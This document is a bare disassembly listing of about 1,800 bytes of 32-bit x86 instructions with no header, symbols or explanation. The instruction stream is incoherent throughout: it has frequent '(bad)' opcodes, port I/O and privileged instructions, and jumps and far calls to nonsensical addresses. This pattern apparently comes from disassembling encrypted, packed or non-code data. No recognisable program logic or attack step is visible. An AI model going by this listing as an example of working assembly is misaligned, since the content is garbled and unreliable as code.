  40373b:	retf   0xbb8b
  40373e:	push   cs
  40373f:	aad    0x5d
  403741:	mov    dl,BYTE PTR [eax+0x5e]
  403744:	fwait
  403745:	xchg   ecx,eax
  403746:	stos   BYTE PTR es:[edi],al
  403747:	ins    BYTE PTR es:[edi],dx
  403748:	in     al,0x23
  40374a:	dec    edx
  40374b:	sub    ecx,esp
  40374d:	mov    ds:0x16e56697,al
  403752:	xor    al,0xe2
  403754:	in     eax,0xaa
  403756:	mov    ch,0x62
  403758:	pop    ebx
  403759:	js     0x40371e
  40375b:	mov    bh,BYTE PTR [edi]
  40375d:	adc    DWORD PTR [edx-0x56d4c2c6],ebx
  403763:	push   ebx
  403764:	sbb    eax,0x9a17cf42
  403769:	xor    DWORD PTR [edi],edi
  40376b:	push   0x73
  40376d:	cmp    eax,0x1ae647e8
  403772:	int    0x7c
  403774:	sub    BYTE PTR [esi],dl
  403776:	add    eax,eax
  403778:	pop    ecx
  403779:	in     al,dx
  40377a:	test   al,0xa5
  40377d:	aaa    
  40377e:	inc    ecx
  40377f:	dec    edi
  403780:	mov    bl,0x1d
  403782:	ret    
  403783:	mov    dh,0xd5
  403785:	xor    al,0xa8
  403787:	sbb    BYTE PTR [eax-0x3475a395],ah
  40378d:	jmp    0x403808
  40378f:	mov    WORD PTR [edi+0x6d],ds
  403792:	(bad)  
  403793:	nop    DWORD PTR [edx-0x7f6562b1]
  40379a:	jns    0x4037f1
  40379c:	add    DWORD PTR [esi],0x3e
  40379f:	in     eax,dx
  4037a0:	dec    ecx
  4037a1:	dec    eax
  4037a2:	add    ebx,DWORD PTR [eax-0x24]
  4037a5:	in     eax,0xd2
  4037a7:	les    esp,FWORD PTR [ebp-0x779c7f17]
  4037ad:	aas    
  4037ae:	sti    
  4037af:	repz cmp eax,0x6c2417e7
  4037b5:	inc    edx
  4037b6:	into   
  4037b7:	and    cl,BYTE PTR [eax+ecx*8+0x37e6c249]
  4037be:	jge    0x4037dd
  4037c0:	dec    esi
  4037c1:	out    dx,al
  4037c2:	pop    eax
  4037c3:	cld    
  4037c4:	out    dx,eax
  4037c5:	icebp  
  4037c6:	int    0x47
  4037c8:	test   al,bl
  4037ca:	xchg   ebx,eax
  4037cb:	xchg   ebx,eax
  4037cc:	imul   ebx,DWORD PTR [esi-0x4e48aba],0xffffffec
  4037d3:	jnp    0x403781
  4037d5:	dec    DWORD PTR [ebx+0xcbeb3de]
  4037db:	rdpmc  
  4037dd:	loop   0x403849
  4037df:	inc    edx
  4037e0:	dec    esi
  4037e1:	in     eax,0x30
  4037e3:	inc    edi
  4037e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037e5:	loop   0x403863
  4037e7:	pusha  
  4037e8:	mov    bl,0xc8
  4037ea:	adc    cl,BYTE PTR fs:[edx-0x27480b63]
  4037f1:	add    bl,BYTE PTR ds:0xd332c9a0
  4037f7:	lock push es
  4037f9:	aaa    
  4037fa:	or     bh,BYTE PTR [edx-0x8]
  4037fd:	mov    esi,0x31e87921
  403802:	mov    edi,0xb46fd030
  403807:	fwait
  403808:	inc    ecx
  403809:	adc    BYTE PTR [ebx-0x1b3fc274],al
  40380f:	in     eax,dx
  403810:	mov    esp,0x58943f17
  403815:	les    edi,FWORD PTR [ebx-0x1745079c]
  40381b:	mov    ecx,DWORD PTR [edx+0x49]
  40381e:	xor    DWORD PTR [esi+0xe3f1081],0xffffffb2
  403825:	loop   0x403809
  403827:	or     cl,BYTE PTR [eax+esi*1+0x6c386d50]
  40382e:	ds test al,0x5d
  403831:	mov    bl,0xfb
  403833:	clc    
  403834:	jg     0x403874
  403836:	loopne 0x403893
  403838:	mov    BYTE PTR [esi],bh
  40383a:	lds    edi,FWORD PTR [edi+0x36]
  40383d:	mov    dh,0x6c
  40383f:	and    DWORD PTR [si+0x606d],ecx
  403844:	cmp    DWORD PTR [ecx+0x3dd283f1],esi
  40384a:	pop    ds
  40384b:	mov    dh,0x6c
  40384d:	out    dx,eax
  40384e:	xchg   BYTE PTR [ecx-0x52],cl
  403851:	(bad)  [esi-0x3586c0da]
  403857:	adc    eax,0x5170aa4d
  40385c:	outs   dx,BYTE PTR ds:[esi]
  40385d:	mov    BYTE PTR [esp],bl
  403860:	adc    dh,al
  403862:	out    dx,al
  403863:	inc    esi
  403864:	loop   0x403812
  403866:	and    DWORD PTR [esp+ebp*1-0x1620abc5],0x40b31218
  403871:	sub    al,0x2e
  403873:	enter  0xd5d9,0xd7
  403877:	mov    WORD PTR [eax+0x73],ds
  40387a:	shl    edi,cl
  40387c:	stc    
  40387d:	and    al,0x97
  40387f:	mov    ecx,DWORD PTR [ecx]
  403881:	push   edx
  403882:	mov    ds:0xa4fa0847,al
  403887:	add    BYTE PTR [edx-0x554c8186],0xe
  40388e:	cld    
  40388f:	dec    edi
  403890:	mov    ebp,0xb640fa82
  403895:	outs   dx,DWORD PTR ds:[esi]
  403896:	test   al,0x9d
  403898:	loope  0x40389b
  40389a:	nop
  40389b:	lods   al,BYTE PTR ds:[esi]
  40389c:	in     al,dx
  40389d:	(bad)  
  40389e:	adc    al,0xc7
  4038a0:	mov    al,0xd3
  4038a2:	xlat   BYTE PTR ds:[ebx]
  4038a3:	or     esi,DWORD PTR [ecx+edi*2+0x640b3061]
  4038aa:	push   DWORD PTR [esi]
  4038ac:	mov    cl,0xcb
  4038ae:	jmp    0x40389a
  4038b0:	pop    ss
  4038b1:	push   0xffffffe1
  4038b3:	add    ecx,ebp
  4038b5:	jecxz  0x40391f
  4038b7:	mov    ds:0x15873376,eax
  4038bc:	test   DWORD PTR [eax+edx*2+0x15],esp
  4038c0:	adc    al,ch
  4038c2:	repz sar DWORD PTR [eax+0xd],0xc1
  4038c7:	xor    dh,bh
  4038c9:	jmp    0xc4c58518
  4038ce:	cmp    eax,0xdda51cfb
  4038d3:	cld    
  4038d4:	cmp    DWORD PTR [ebx],esp
  4038d6:	mov    al,ds:0x55ddd81f
  4038db:	pop    esi
  4038dc:	adc    DWORD PTR [esi+0x41],0xe4dc9ecb
  4038e3:	add    al,0x87
  4038e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038e6:	adc    BYTE PTR [ecx],bl
  4038e8:	jb     0x4038e3
  4038ea:	push   esi
  4038eb:	mov    ebp,0xfebad95c
  4038f0:	not    DWORD PTR [ebx+0x6c]
  4038f3:	test   DWORD PTR [ebx+ebp*8-0x5b],eax
  4038f7:	scas   eax,DWORD PTR es:[edi]
  4038f8:	aad    0xcb
  4038fa:	loopne 0x40392c
  4038fc:	dec    ebx
  4038fd:	add    cl,BYTE PTR [esi+0x15]
  403900:	jecxz  0x403912
  403902:	scas   eax,DWORD PTR es:[edi]
  403903:	repnz aam 0x46
  403906:	cs femms 
  403909:	xchg   edi,eax
  40390a:	jnp    0x403983
  40390c:	cmp    al,BYTE PTR [edi+0x75]
  40390f:	dec    ebx
  403910:	aas    
  403911:	dec    ebp
  403912:	pop    si
  403914:	mov    eax,0x65e7b5fd
  403919:	xor    bl,BYTE PTR [ebp-0x60]
  40391c:	ins    BYTE PTR es:[edi],dx
  40391d:	aad    0xa7
  40391f:	xchg   ecx,eax
  403920:	(bad)  
  403921:	push   ebp
  403922:	sub    esi,ebp
  403924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403925:	xchg   ebx,eax
  403926:	cmp    al,al
  403928:	xchg   ecx,ecx
  40392a:	mov    ebp,0x868df8fa
  40392f:	mov    dl,0x52
  403931:	xchg   ebx,eax
  403932:	sbb    dl,dh
  403934:	popf   
  403935:	push   cs
  403936:	xchg   ecx,eax
  403937:	repz jbe 0x403959
  40393a:	data16 addr16 mov ch,0xc1
  40393e:	cli    
  40393f:	icebp  
  403940:	rcl    dl,cl
  403942:	fs xchg ecx,eax
  403944:	push   0xb
  403946:	test   eax,0x67e0a100
  40394b:	sbb    eax,DWORD PTR [ecx]
  40394d:	or     dh,dh
  40394f:	adc    ebp,edi
  403951:	pusha  
  403952:	jmp    0x41fa1a5f
  403957:	or     al,0x30
  403959:	sub    ebx,DWORD PTR [edi]
  40395b:	push   0xea376973
  403960:	xlat   BYTE PTR ds:[ebx]
  403961:	iret   
  403962:	jb     0x403940
  403964:	push   ebx
  403965:	bound  edx,QWORD PTR [ebp-0x32d28aa2]
  40396b:	cli    
  40396c:	dec    ecx
  40396d:	test   DWORD PTR ds:0x3f2192e6,edi
  403973:	jb     0x4039ac
  403975:	sbb    bl,BYTE PTR [edx]
  403977:	sub    eax,0x8a91b858
  40397c:	xchg   ecx,eax
  40397d:	xchg   esp,eax
  40397e:	sub    DWORD PTR [ebx-0x4e],ecx
  403981:	mov    esi,0x8f609dd8
  403986:	js     0x403a01
  403988:	cmp    eax,0x214cfa0e
  40398d:	gs scas al,BYTE PTR es:[edi]
  40398f:	jmp    0x40394a
  403991:	mov    gs,WORD PTR [ebp+0x42]
  403994:	hlt    
  403995:	mov    esp,0xe37b093a
  40399a:	shr    DWORD PTR [edi+eiz*8+0x67],0x11
  40399f:	mov    BYTE PTR [ebx-0x3d],dl
  4039a2:	ins    DWORD PTR es:[edi],dx
  4039a3:	in     al,0x3f
  4039a5:	mov    bl,0x7a
  4039a7:	mov    BYTE PTR [edi+edi*2],cl
  4039aa:	mov    dh,0x4
  4039ac:	cmp    BYTE PTR [edx-0x2f],0x10
  4039b0:	jp     0x403949
  4039b2:	xchg   ebx,eax
  4039b3:	scas   eax,DWORD PTR es:[edi]
  4039b4:	adc    eax,0x53200b4
  4039b9:	mov    bl,0xb
  4039bb:	jns    0x4039cf
  4039bd:	mov    edi,0x6f5b160
  4039c2:	pandn  mm1,QWORD PTR [edx-0x53]
  4039c6:	das    
  4039c7:	inc    edi
  4039c8:	jmp    0x9c06056d
  4039cd:	push   0x39db49ca
  4039d2:	daa    
  4039d3:	dec    eax
  4039d4:	xchg   esp,eax
  4039d5:	in     eax,dx
  4039d6:	mov    fs,WORD PTR ds:0xddeceea8
  4039dc:	xchg   edx,eax
  4039dd:	push   ss
  4039de:	adc    bl,cl
  4039e0:	or     al,0xe4
  4039e2:	retf   
  4039e3:	xchg   ebx,eax
  4039e4:	ret    0x53c6
  4039e7:	pop    ecx
  4039e8:	aad    0x46
  4039ea:	iret   
  4039eb:	stos   DWORD PTR es:[edi],eax
  4039ec:	sbb    BYTE PTR [ecx-0x7df7cfd9],ah
  4039f2:	mov    dh,0x5
  4039f4:	out    0x1c,eax
  4039f6:	or     ah,ah
  4039f8:	xchg   ebx,eax
  4039f9:	fst    DWORD PTR [edx]
  4039fb:	pop    es
  4039fc:	pop    ebx
  4039fd:	mov    ebp,0xcde5bb98
  403a02:	call   0x9883:0x1882f9d6
  403a09:	mov    ds:0x75e91ca5,al
  403a0e:	pop    es
  403a0f:	push   0x50c62ab1
  403a14:	cmp    al,0x4d
  403a16:	cmp    BYTE PTR [edi-0x3b],dh
  403a19:	sub    dh,BYTE PTR [ebx+edi*4+0x4ac6ac2a]
  403a20:	mov    eax,ebp
  403a22:	inc    ecx
  403a23:	ror    DWORD PTR [edi],0x74
  403a26:	aas    
  403a27:	or     al,0x8c
  403a29:	xor    al,0x65
  403a2b:	mov    edi,0xb21cde77
  403a30:	mov    esp,0xc1d84a14
  403a35:	adc    BYTE PTR [edx+0x6e537fd],0x67
  403a3c:	call   0x12e8:0x370c51a5
  403a43:	lds    ebp,FWORD PTR [eax+0x78bf3244]
  403a49:	dec    eax
  403a4a:	sub    ecx,ecx
  403a4c:	push   es
  403a4d:	(bad)  
  403a4e:	cmp    BYTE PTR [eax+0x5f07b7cc],ch
  403a54:	fldenv [ecx-0x3d387108]
  403a5a:	mov    ds:0x489180d,eax
  403a5f:	jne    0x403a58
  403a61:	mov    ?,ebp
  403a63:	push   ecx
  403a64:	cmp    ecx,0x78
  403a67:	jo     0x403a88
  403a69:	stc    
  403a6a:	push   edi
  403a6b:	xchg   ebx,eax
  403a6c:	or     eax,0xb4a46a03
  403a71:	xchg   edx,eax
  403a72:	jne    0x403ab3
  403a74:	jecxz  0x403a7b
  403a76:	or     al,0xca
  403a78:	je     0x403a3a
  403a7a:	dec    ebp
  403a7b:	test   eax,0x3f49a8a
  403a80:	mov    ebp,DWORD PTR [ebp+0x2a82a915]
  403a86:	adc    esp,esp
  403a88:	test   eax,0xeff497c4
  403a8d:	sub    edx,DWORD PTR [edi+0x4b0e874f]
  403a93:	add    dh,BYTE PTR [ebx]
  403a95:	mov    ebp,0x6788671b
  403a9a:	push   ebp
  403a9b:	cmp    ah,dl
  403a9d:	sar    DWORD PTR [ebx+0x78],1
  403aa0:	ss pushf 
  403aa2:	popf   
  403aa3:	xchg   ebx,eax
  403aa4:	cmp    al,0x43
  403aa6:	ds push ecx
  403aa8:	mov    dl,0x4a
  403aaa:	in     eax,0xb6
  403aac:	into   
  403aad:	aam    0x15
  403aaf:	and    al,0x5f
  403ab1:	push   0xa736298f
  403ab6:	rol    BYTE PTR [ecx+0x3f127d8],cl
  403abc:	pop    ebp
  403abd:	or     BYTE PTR [eax-0x10],dh
  403ac0:	inc    edi
  403ac1:	adc    esp,DWORD PTR ss:[edx]
  403ac4:	loop   0x403ac6
  403ac6:	mov    BYTE PTR [eax+ebp*4],dl
  403ac9:	dec    esi
  403aca:	repnz int 0xfa
  403acd:	sbb    edi,0x4405eb10
  403ad3:	push   ebp
  403ad4:	lods   eax,DWORD PTR ds:[esi]
  403ad5:	inc    edi
  403ad6:	inc    esi
  403ad7:	jge    0x403a80
  403ad9:	gs jb  0x403aeb
  403adc:	adc    DWORD PTR [ecx+0x37baa1b2],esi
  403ae2:	and    DWORD PTR [eax+0x49ae3509],ebp
  403ae8:	sub    BYTE PTR [ebx],dl
  403aea:	cs xchg edi,eax
  403aec:	push   0xcbab38a9
  403af1:	retf   0x8d59
  403af4:	mov    ebp,0x1af733fb
  403af9:	xor    eax,DWORD PTR [ecx+0x33]
  403afc:	fisubr DWORD PTR [edi]
  403afe:	aaa    
  403aff:	das    
  403b00:	cli    
  403b01:	mov    bl,0x5f
  403b03:	and    DWORD PTR [ebx],esp
  403b05:	mov    eax,ebx
  403b07:	leave  
  403b08:	xchg   edx,eax
  403b09:	cld    
  403b0a:	dec    ecx
  403b0b:	fwait
  403b0c:	pop    edx
  403b0d:	femms  
  403b0f:	cmp    DWORD PTR [ecx-0x7d0acaae],esp
  403b15:	test   DWORD PTR [ebx],edx
  403b17:	test   BYTE PTR [esi-0x7d4bd77b],al
  403b1d:	in     al,0x33
  403b1f:	aas    
  403b20:	lock pop eax
  403b22:	cwde   
  403b23:	sbb    ecx,esi
  403b25:	and    BYTE PTR [edx+0x21],dh
  403b28:	call   0x57d21cce
  403b2d:	push   esp
  403b2e:	pop    edx
  403b2f:	and    DWORD PTR [eax-0x662b1f2d],0xd9e81e46
  403b39:	jmp    0x4d3f:0xa08a4d49
  403b40:	out    0x82,eax
  403b42:	fmul   st,st(5)
  403b44:	nop
  403b45:	cwde   
  403b46:	arpl   WORD PTR [edx-0x35],ax
  403b49:	out    dx,al
  403b4a:	jo     0x403b02
  403b4c:	mov    ds:0x52f83e0b,al
  403b51:	ret    
  403b52:	mov    eax,ds:0xf89e3f8a
  403b57:	mov    ecx,DWORD PTR [ecx+0x226d5282]
  403b5d:	pop    esi
  403b5e:	push   eax
  403b5f:	push   ss
  403b60:	and    dh,BYTE PTR ds:0xa559071d
  403b66:	fcom   DWORD PTR [eax+0x4c8d81cd]
  403b6c:	or     ebx,DWORD PTR [esi]
  403b6e:	dec    esp
  403b6f:	pop    ds
  403b70:	or     ecx,DWORD PTR [edx-0x1f10d227]
  403b76:	into   
  403b77:	(bad)  
  403b78:	pop    edx
  403b79:	je     0x403b01
  403b7b:	push   eax
  403b7c:	pop    ebx
  403b7d:	jmp    0x403b71
  403b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b80:	loop   0x403b0c
  403b82:	es (bad) 
  403b85:	ins    DWORD PTR es:[edi],dx
  403b86:	xor    ebx,edi
  403b88:	add    esp,0xda63da9d
  403b8e:	test   DWORD PTR [edx+0x48],ebx
  403b91:	push   ebx
  403b92:	mov    eax,ds:0x89191345
  403b97:	and    al,0x9
  403b99:	push   es
  403b9a:	loope  0x403bc3
  403b9c:	stos   DWORD PTR es:[edi],eax
  403b9d:	fild   DWORD PTR [ebx+0x3be02eb2]
  403ba3:	push   cs
  403ba4:	mov    bl,0xd4
  403ba6:	jnp    0x403b7b
  403ba8:	jg     0x403c28
  403baa:	and    eax,0xa4738283
  403baf:	call   0xfda85416
  403bb4:	xor    ah,al
  403bb6:	stc    
  403bb7:	lea    ecx,[esi-0x4315cfa7]
  403bbd:	add    eax,0x3b464e0b
  403bc2:	(bad)  
  403bc3:	mov    ds:0xbee602f3,al
  403bc8:	cmc    
  403bc9:	fxch   st(1)
  403bcb:	jg     0x403b80
  403bcd:	aaa    
  403bce:	add    eax,0x9117b269
  403bd3:	dec    ebx
  403bd4:	or     esi,ecx
  403bd6:	jg     0x403c55
  403bd8:	xor    ebp,DWORD PTR [edi+0xc]
  403bdb:	in     eax,dx
  403bdc:	dec    esp
  403bdd:	shr    BYTE PTR [eax+0x5f],0x48
  403be1:	outs   dx,BYTE PTR ds:[esi]
  403be2:	les    edi,FWORD PTR [eax]
  403be4:	sbb    DWORD PTR [ebp-0x7465ba2],eax
  403bea:	fldcw  WORD PTR [eax+ecx*8]
  403bed:	idiv   edi
  403bef:	pop    esi
  403bf0:	jp     0x403c3a
  403bf2:	sub    eax,DWORD PTR [ebx+0x29b9808c]
  403bf8:	dec    edi
  403bf9:	shr    ecx,cl
  403bfb:	push   ss
  403bfc:	cdq    
  403bfd:	sub    esi,edi
  403bff:	addr16 mov bh,0x5b
  403c02:	push   edx
  403c03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c04:	jns    0x403c71
  403c06:	stos   BYTE PTR es:[edi],al
  403c07:	stos   DWORD PTR es:[edi],eax
  403c08:	pop    ebx
  403c09:	in     eax,0x98
  403c0b:	add    eax,0x14ffd01a
  403c10:	(bad)  
  403c11:	stc    
  403c12:	cmc    
  403c13:	fwait
  403c14:	or     esi,ecx
  403c16:	jns    0x403c88
  403c18:	test   al,0xf0
  403c1a:	mov    ds:0xc1fd5ed5,al
  403c1f:	xchg   ecx,eax
  403c20:	adc    esi,0x5195bf34
  403c26:	pushf  
  403c27:	dec    eax
  403c28:	add    dh,BYTE PTR [ecx-0x2e]
  403c2b:	push   ebx
  403c2c:	popa   
  403c2d:	and    esp,ebx
  403c2f:	sub    bl,ah
  403c31:	xlat   BYTE PTR ds:[ebx]
  403c32:	push   ss
  403c33:	add    DWORD PTR [ebp+0x1a7ccafc],ebp
  403c39:	cmp    BYTE PTR ds:0x6befe7fe,ch
  403c3f:	stos   BYTE PTR es:[edi],al
  403c40:	jmp    0x403c21
  403c42:	or     ebp,DWORD PTR [ebx+0xcf54ad1]
  403c48:	sahf   
  403c49:	mov    al,ds:0x7488dbb9
  403c4e:	push   ss
  403c4f:	lods   al,BYTE PTR ds:[esi]
  403c50:	pop    edi
  403c51:	test   DWORD PTR [ebp+0x4d6062e4],edi
  403c57:	xchg   ebx,eax
  403c58:	or     eax,DWORD PTR [edx]
  403c5a:	dec    ebx
  403c5b:	aad    0xf5
  403c5d:	pop    es
  403c5e:	add    eax,DWORD PTR [ebx-0x7e9f40b9]
  403c64:	pop    ecx
  403c65:	add    al,0x5e
  403c67:	jp     0x403c9d
  403c69:	mov    al,0x64
  403c6b:	lea    ebx,[ebx-0x45f8a434]
  403c71:	pop    ebp
  403c72:	add    BYTE PTR [ebp+edx*8+0x5433c171],ah
  403c79:	neg    DWORD PTR [ecx-0x62bb5ab4]
  403c7f:	daa    
  403c80:	cmp    DWORD PTR [edx+ebx*1-0x37ed3e28],ebx
  403c87:	xor    al,0xbd
  403c89:	mov    WORD PTR [ecx-0x4],?
  403c8c:	imul   ecx,DWORD PTR [esi],0x1c
  403c8f:	sub    dl,BYTE PTR [esi+ecx*8+0x13]
  403c93:	jb     0x403c3f
  403c95:	pop    esp
  403c96:	loopne 0x403cbd
  403c98:	push   ss
  403c99:	sub    BYTE PTR [ebx-0x4a],bl
  403c9c:	test   BYTE PTR ds:0x7003b215,0xf1
  403ca3:	push   cs
  403ca4:	ficomp DWORD PTR [eax]
  403ca6:	cmc    
  403ca7:	and    DWORD PTR [edi+0x31],edx
  403caa:	shr    BYTE PTR [eax-0x21602f23],0xd
  403cb1:	mov    dh,0x38
  403cb3:	mov    esi,0x5c538c50
  403cb8:	push   ds
  403cb9:	retf   0xebb7
  403cbc:	stos   BYTE PTR es:[edi],al
  403cbd:	mov    ebp,ebp
  403cbf:	int    0x8f
  403cc1:	fmul   st(4),st
  403cc3:	into   
  403cc4:	loopne 0x403d33
  403cc6:	cs (bad) 
  403cc8:	mov    eax,ds:0x98a27b6f
  403ccd:	xlat   BYTE PTR ds:[ebx]
  403cce:	sbb    DWORD PTR [ecx-0x57],ecx
  403cd1:	jmp    0x39bb:0x8a5bac95
  403cd8:	sub    esp,esp
  403cda:	out    dx,eax
  403cdb:	mov    al,ds:0xe1e618c1
  403ce0:	mov    ebp,0x6f3643ee
  403ce5:	jne    0x403c86
  403ce7:	out    0x74,eax
  403ce9:	xlat   BYTE PTR ds:[ebx]
  403cea:	arpl   WORD PTR [esi],di
  403cec:	es mov dl,0x7d
  403cef:	sbb    al,0xe9
  403cf1:	fs cmp al,0x19
  403cf4:	dec    ecx
  403cf5:	out    0x2f,eax
  403cf7:	inc    eax
  403cf8:	mov    BYTE PTR [ebx+0x70],dh
  403cfb:	mov    bh,0x7d
  403cfd:	lea    ebp,[ecx]
  403cff:	adc    BYTE PTR [edi+0x6acd8012],0xa7
  403d06:	cwde   
  403d07:	mov    edx,0xeca72749
  403d0c:	inc    esp
  403d0d:	lods   eax,DWORD PTR ds:[esi]
  403d0e:	jle    0x403cfa
  403d10:	je     0x403d1e
  403d12:	imul   ebx,DWORD PTR ds:0x37097097,0xb696005b
  403d1c:	outs   dx,BYTE PTR ds:[esi]
  403d1d:	adc    al,0xea
  403d1f:	add    DWORD PTR [ebp+ecx*2-0x72971083],eax
  403d26:	pop    edi
  403d27:	cdq    
  403d28:	(bad)  
  403d29:	std    
  403d2a:	mov    al,BYTE PTR ds:0xd9f7eeba
  403d30:	shl    BYTE PTR [edx+esi*1-0x656c8873],0x8c
  403d38:	jns    0x403d08
  403d3a:	cmp    DWORD PTR [ebx-0x7aaefb70],ecx
  403d40:	xlat   BYTE PTR ds:[ebx]
  403d41:	or     bh,BYTE PTR [edx+ebp*8]
  403d44:	sub    bl,BYTE PTR [edi-0x5afdc89c]
  403d4a:	pop    ecx
  403d4b:	and    al,0xc4
  403d4d:	and    dl,BYTE PTR [esi+0x65a18d9b]
  403d53:	icebp  
  403d54:	scas   al,BYTE PTR es:[edi]
  403d55:	mov    ?,WORD PTR [ecx+edi*1-0x1c914611]
  403d5c:	loop   0x403d88
  403d5e:	loop   0x403d25
  403d60:	jg     0x403db1
  403d62:	xor    ecx,edx
  403d64:	outs   dx,BYTE PTR ds:[esi]
  403d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d66:	sub    al,0xad
  403d68:	add    dh,BYTE PTR [ebx]
  403d6a:	stos   BYTE PTR es:[edi],al
  403d6b:	push   0xffffff86
  403d6d:	rol    edx,1
  403d6f:	cdq    
  403d70:	in     al,dx
  403d71:	in     eax,0x93
  403d73:	xchg   esi,eax
  403d74:	mov    al,ds:0xfc6ec17b
  403d79:	mov    DWORD PTR [edi+0xb332dec],edi
  403d7f:	sub    DWORD PTR [ebx+0x42],esi
  403d82:	inc    ebp
  403d83:	dec    ecx
  403d84:	pushf  
  403d85:	fmul   QWORD PTR [ecx]
  403d87:	sub    al,0x78
  403d89:	paddd  mm5,QWORD PTR [ebp+0x6c331823]
  403d90:	(bad)  
  403d91:	adc    DWORD PTR [ecx],ebp
  403d93:	dec    edi
  403d94:	fwait
  403d95:	cmp    eax,0xa5f2c04c
  403d9a:	pop    edx
  403d9b:	jmp    0xe2c07445
  403da0:	sub    esp,DWORD PTR [edi+0x6cb04435]
  403da6:	(bad)  
  403da7:	lods   al,BYTE PTR ds:[esi]
  403da8:	neg    ecx
  403daa:	pushf  
  403dab:	mov    edx,ebp
  403dad:	push   eax
  403dae:	or     bh,BYTE PTR [eax]
  403db0:	jne    0x403d4f
  403db2:	into   
  403db3:	jbe    0x403d36
  403db5:	das    
  403db6:	cs call 0x8b7f2b5e
  403dbc:	sbb    bh,dl
  403dbe:	lods   eax,DWORD PTR ds:[esi]
  403dbf:	pop    esi
  403dc0:	std    
  403dc1:	movsx  edx,WORD PTR [ecx]
  403dc4:	jne    0x403dd2
  403dc6:	jae    0x403dcf
  403dc8:	pop    es
  403dc9:	inc    esi
  403dca:	fwait
  403dcb:	dec    edx
  403dcc:	(bad)  
  403dcd:	lds    esi,FWORD PTR [edx]
  403dcf:	sbb    al,0x19
  403dd1:	jmp    0x3a26:0xc2cf9514
  403dd8:	xchg   ecx,eax
  403dd9:	stc    
  403dda:	or     ah,BYTE PTR [edi+0x44c2d6cf]
  403de0:	(bad)  
  403de1:	pop    eax
  403de2:	imul   esp,DWORD PTR [ebx],0xffffffd5
  403de5:	jns    0x403e3e
  403de7:	and    edx,DWORD PTR [edx-0x33]
  403dea:	je     0x403d71
  403dec:	loope  0x403ddc
  403dee:	mov    al,0x19
  403df0:	stc    
  403df1:	pop    eax
  403df2:	scas   al,BYTE PTR es:[edi]
  403df3:	mov    ?,WORD PTR [esi]
  403df5:	xchg   ecx,eax
  403df6:	sub    bh,bh
  403df8:	xlat   BYTE PTR ds:[ebx]
  403df9:	mov    bh,0xd9
  403dfb:	out    0x99,eax
  403dfd:	push   eax
  403dfe:	add    cl,dl
  403e00:	enter  0x51de,0x6e
  403e04:	jnp    0x403db9
  403e06:	pop    eax
  403e07:	push   ss
  403e08:	fdivr  DWORD PTR [esi+0x3407eb69]
  403e0e:	xchg   DWORD PTR [edi-0x32455de6],ecx
  403e14:	mov    ds:0x6857038d,al
  403e19:	adc    al,BYTE PTR [eax]
  403e1b:	or     eax,0x6453058b
  403e20:	rcr    DWORD PTR [eax+0x113bed4d],0xd6
  403e27:	gs ret 
  403e29:	iret   
  403e2a:	out    0xe2,al
  403e2c:	add    DWORD PTR [edi-0xb],edx
  403e2f:	imul   ecx,edi,0xe261e36
  403e35:	popa   
  403e36:	mov    ebx,0x546e9fdf
  403e3b:	or     DWORD PTR [eax-0x670077f9],esi
  403e41:	mov    ds:0x9c4fc2d3,al
  403e46:	pop    ds
  403e47:	sub    eax,DWORD PTR [eax+0x63]
  403e4a:	xor    ch,BYTE PTR [edi]
  403e4c:	loopne 0x403eca
  403e4e:	or     BYTE PTR [ebp+0x43],ch
  403e51:	in     al,0xa7
  403e53:	aaa    
  403e54:	aam    0xf8
  403e56:	icebp  
  403e57:	ret    
  403e58:	jg     0x403e72
  403e5a:	and    cl,ah
  403e5c:	cmc    
  403e5d:	adc    DWORD PTR [edi+0x63],ebp
  403e60:	test   BYTE PTR [esi-0x7f06c88e],bl
  403e66:	xlat   BYTE PTR ds:[ebx]
  403e67:	xchg   ebx,eax
  403e68:	(bad)  
  403e6a:	cld    
  403e6b:	jmp    0x6752:0xfdf46527
  403e72:	loope  0x403e43
  403e74:	push   es
  403e75:	sbb    eax,0xdf2819dd
  403e7a:	das    
  403e7b:	js     0x403e21
  403e7d:	push   cs
  403e7e:	xchg   edx,eax
  403e7f:	sub    esp,DWORD PTR [edx+ebp*8]
  403e82:	cli    
  403e83:	das    
  403e84:	(bad)  [ecx-0x4e428b6d]
  403e8a:	into   
  403e8b:	xor    al,0x47
  403e8d:	rol    DWORD PTR [ebx],cl
  403e8f:	fnstcw WORD PTR [ecx+0x2acf245b]
  403e95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e96:	adc    al,0xe5
  403e98:	stos   DWORD PTR es:[edi],eax
  403e99:	mov    ds:0x721f9a0a,al
  403e9e:	out    dx,eax
  403e9f:	lea    ecx,[edx+edi*1+0x1ab97630]
  403ea6:	adc    ch,BYTE PTR ds:0xda7c299e
  403eac:	rol    ebp,1
  403eae:	dec    ecx
  403eaf:	cmp    BYTE PTR [eax+0x36],bl
  403eb2:	xor    eax,0xea7e6b5
  403eb7:	xor    BYTE PTR [ecx-0x78],0x66
  403ebb:	jp     0x403e5a
  403ebd:	push   edi
  403ebe:	and    DWORD PTR [ebx+ebp*2],esp
  403ec1:	jl     0x403eef
  403ec3:	imul   eax,DWORD PTR [ebp-0x7d333821],0x89c912ba
  403ecd:	inc    edi
  403ece:	mov    esi,0x95fc8de2
  403ed3:	cmp    DWORD PTR [edx],0xffffffc0
  403ed6:	xlat   BYTE PTR ds:[ebx]
  403ed7:	adc    eax,0x411f1639
  403edc:	jne    0x403e9a
  403ede:	cmc    
  403edf:	or     dh,BYTE PTR [ebx]
  403ee1:	gs ss mov ecx,0x9d1d6c6a
  403ee8:	retf   0xc172
  403eeb:	jbe    0x403e7d
  403eed:	add    bl,BYTE PTR [ebx+0x273d9b29]
  403ef3:	push   ebp
  403ef4:	imul   ecx,DWORD PTR [ebx+0x6af48bd4],0x4e275bb
  403efe:	push   eax
  403eff:	stos   DWORD PTR es:[edi],eax
  403f00:	and    al,0x1e
  403f02:	adc    BYTE PTR [ebp+0x1ded19bc],cl
  403f08:	mov    bl,0x6d
  403f0a:	(bad)  [ecx+0x5d0b21a1]
  403f10:	addr16 dec esi
  403f12:	jecxz  0x403e98
  403f14:	sub    BYTE PTR [esi],al
  403f16:	out    dx,eax
  403f17:	in     eax,0x27
  403f19:	sub    dl,bh
  403f1b:	fwait
  403f1c:	mov    bl,0x7d
